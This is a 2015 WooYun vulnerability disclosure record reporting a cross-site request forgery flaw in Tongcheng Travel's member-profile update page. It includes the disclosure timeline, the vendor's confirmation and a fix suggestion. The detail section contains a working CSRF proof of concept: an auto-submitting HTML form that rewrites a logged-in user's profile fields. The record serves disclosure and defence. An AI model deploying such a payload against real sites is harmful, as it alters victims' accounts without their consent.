{"id": 83036, "wybug_id": "wooyun-2015-0149137", "wybug_title": "同程csrf修改任意用户资料", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "昊昊", "wybug_date": "2015-10-26 12:30", "wybug_open_date": "2015-12-10 12:32", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向公众公开  简要描述： 同程csrf修改任意用户资料 详细说明：  需登录地址：http://member.ly.com/Member/MemberInfomation.aspx这个地址修改资料保存的时候，抓包得到的数据含有referer，但没起到任何作用。含有referer时可以修改成功：\n\n去掉referer时仍然可以修改成功：\n\n可以判断存在csrf,防御措施不到位。修改前个人信息：\n\n   漏洞证明：  这里仅演示修改了qq号码那一栏参数，当然都能修改成功。构造简单csrf poc：<html>  <body>    <form  id='id' action=\"http://member.ly.com/AjaxHandler/MemberInformationHandler.ashx?action=submitinformation\" method=\"POST\">      <input type=\"hidden\" name=\"info\" value=\"&#123;&quot;Name&quot;&#58;&quot;王凯&quot;&#44;&quot;PetName&quot;&#58;&quot;065E343567637FB2&quot;&#44;&quot;Sex&quot;&#58;&quot;rdman&quot;&#44;&quot;CardType&quot;&#58;&quot;1&quot;&#44;&quot;CardNo&quot;&#58;&quot;3&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;&#42;7&quot;&#44;&quot;Profession&quot;&#58;&quot;19&quot;&#44;&quot;YearOfBirth&quot;&#58;&quot;1985&quot;&#44;&quot;MonthOfBirth&quot;&#58;&quot;1&quot;&#44;&quot;DayOfBirth&quot;&#58;&quot;1&quot;&#44;&quot;QQNo&quot;&#58;&quot;just test！&quot;&#125;\" />      <input type=\"submit\" value=\"Submit request\" />    </form>\t<script>        document.getElementById('id').submit();       </script>  </body></html>点击之后：\n\n\n\n   修复方案：  严格验证referer   版权声明：转载请注明来源 昊昊@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-10-26 12:31 厂商回复： 感谢关注同程旅游 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-03 18:35 |    \t\t昊昊 \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:44        | ...)\t\t \n  京东卡已花光 感谢:)    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}